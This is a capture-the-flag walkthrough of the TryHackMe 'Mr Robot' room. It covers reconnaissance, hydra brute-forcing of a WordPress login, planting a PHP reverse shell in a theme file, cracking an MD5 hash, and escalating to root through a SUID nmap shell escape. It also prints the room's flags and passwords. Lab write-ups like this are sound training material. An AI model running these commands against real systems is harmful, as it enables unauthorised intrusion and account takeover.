# Tryhackme.com Room : Mr Robot
`https://tryhackme.com/room/mrrobot`


# Instance
```
export IP=10.10.11.95
```

# Task 1

1. What is key 1 ?

Nmap results : 
```
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

Both https && http version of the website resolve to the same thing.

It is an interactive shell with the following options :

```
- Prepare
	- NOTHING. Small video
- fsociety
	- NOTHING. Small video
- inform
	- Some dialog with images, didn't find anything usefull
- question
	- Some images. (Steg ? Prob not)
- wakeup
	- NOTHING. Small video
- join
	- Ask for an email address. Doesn't seem to send anything to it.
```

In robots.txt we find :
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

First key is 
```
073403c8a58a1f80d943455fb30724b9
```

2. Get the second key.

The `fsociety.dic` file give us a list of word (Dictionary). Probably to be used to bruteforce some login

Lets run gobuster `gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://$IP`

There is a lot of stuff in here :
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
	- Wordpress blog
/0000 (Status: 301)
	- Seems to be the same wordpress blog ?
/Image (Status: 301)
	- Seems to be redirecting to a seach in a wordpress instance.
	- Not sure it is the same as the one running at /0
	- Anything after the / seems to redirect to the wordpress page (Even 404)
/admin (Status: 301)
	- The page look like a prompt but it keep refreshing. Looked up the javascript a bit, might need a specific user agent to be able to browse the page.
/atom (Status: 301)
	-Refirect to /feed/atom/, Might be related to a wordpress plugin ?
/audio (Status: 301)
	- Forbidden access
/blog (Status: 301)
	- Forbidden access
```

I poked around the /admin page.
Manage to retrieve the html & js using wget
```
wget http://$IP/admin/index.html
wget http://$IP/admin/js/main-acba06a5.js
```

The same main.js is loaded from / and /admin

We went another way here, let's try to bruteforce the wordpress website.

We could do via xmlrpc since it's available but we could simply hammer the http post at /login

We first need to determine the user, tried some user enumeration with /?author=1... But wasn't able to get results.
Either because / serve the cmd prompt and not the wordpress instance. OR because there is no post on the blog.

Anyways, when we login via the web interface, we get a message that the user is invalid. We can bruteforce the user using a dummy password with hydra :
```
hydra -L fsocity.dic -p test 10.10.246.110 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
```

We get the username
```
Elliot
```

We then use hydra again to find the password :
```
hydra -l Elliot -P fsocity.dic 10.10.246.110 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -t 30
```

Took a while because my connexion sucks but we finally found the password :
```
ER28-0652
```

Now that we can login into the admin panel, let's inject some php.

We use `menu -> Appearance -> Editor->Current Theme` than we edit the `footer.php` file. (We could have put the code elsewhere)

We will just use this reverse shell script from here : ` `

That we simply paste in the footer.php file, no need to be more elegant than this :P

We open a netcat connection on our machine
```

```

We load any pages from the blog and we get a reverse shell.

We go to `/home/robot` and find 2 files
```
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We crack the password with john :
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwd
```

And obtain the password for the robot user
```
robot:abcdefghijklmnopqrstuvwxyz
```

We try to `su robot` but we get an error
```
su: must be run from a terminal
```

I found here (https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) how to go around this.
We used python to spawn another shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Than we were able to su into robot.

We get the second flag `cat /home/robot/key-2-of-3.txt`
```
822c73956184f694993bede3eb39f959
```

http://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh


We can log in in ssh using those credentials


sudo 1.8.9p5
Linux 3.13.0-55-generic

nmap was set as a SUID binary.

We can
```
> nmap --interactive
> !sh
> whoami
root
> cat /root/key-3-of-3.txt
```

Last key :
```
04787ddef27c3dee1ee161b21670b4e4
```

